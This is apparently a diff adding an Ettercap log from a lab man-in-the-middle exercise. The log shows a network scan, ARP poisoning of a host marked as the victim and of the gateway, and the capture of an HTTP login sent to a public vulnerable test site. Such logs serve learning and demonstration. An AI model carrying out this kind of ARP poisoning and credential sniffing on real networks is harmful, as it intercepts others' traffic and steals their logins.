@@ -1,0 +1,32 @@
+Listening on:
+  eth0 -> 00:0C:29:25:37:01
+	  192.168.83.130/255.255.255.0
+	  fe80::20c:29ff:fe25:3701/64
+
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Ettercap might not work correctly. /proc/sys/net/ipv6/conf/eth0/use_tempaddr is not set to 0.
+Privileges dropped to EUID 65534 EGID 65534...
+
+  34 plugins
+  42 protocol dissectors
+  57 ports monitored
+28230 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+Starting Unified sniffing...
+
+Randomizing 255 hosts for scanning...
+Scanning the whole netmask for 255 hosts...
+4 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+ GROUP 1 : ANY (all the hosts in the list)
+
+ GROUP 2 : ANY (all the hosts in the list)
+Host 192.168.83.129 added to TARGET1 // VICTIM IP- ADDRESS
+Host 192.168.83.254 added to TARGET2 // GATEWAY 
+Host 192.168.83.254 added to TARGET2
+HTTP : 44.228.249.3:80 -> USER: test  PASS: himan  INFO: http://testphp.vulnweb.com/login.php
+CONTENT: uname=test&pass=himan
